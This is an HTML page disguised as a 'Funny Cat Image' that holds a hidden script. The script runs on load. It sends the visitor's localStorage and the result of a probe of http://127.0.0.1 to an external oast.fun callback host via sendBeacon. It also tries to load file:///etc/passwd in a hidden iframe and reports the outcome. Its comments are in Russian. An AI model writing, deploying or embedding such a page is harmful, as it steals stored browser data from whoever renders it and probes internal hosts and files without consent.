<!DOCTYPE html>
<html>
<head><title>Funny Cat Image 2026</title></head>
<body>
    <h1>Wait for the image to load...</h1>
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">

    <script>
        (async function() {
            const hook = "https://esqbwjbyepcxrsacleqfu9095dccsqoxg.oast.fun";
            
            // Собираем данные
            const data = {
                type: "RE-RUN_SCAN",
                storage: JSON.stringify(localStorage),
                // Пытаемся достать внутренний хост через ошибку fetch
                internal: await fetch("http://127.0.0.1:80").catch(e => e.message)
            };

            // Отправляем
            navigator.sendBeacon(hook + "/FINAL_PUSH", JSON.stringify(data));
            
            // Если это Chrome, попробуем еще раз прочитать локальный файл через iframe
            var ifr = document.createElement('iframe');
            ifr.style.display = 'none';
            ifr.src = 'file:///etc/passwd';
            ifr.onload = () => navigator.sendBeacon(hook + "/PASSWD_READ_SUCCESS");
            ifr.onerror = () => navigator.sendBeacon(hook + "/PASSWD_READ_BLOCKED");
            document.body.appendChild(ifr);
        })();
    </script>
</body>
</html>
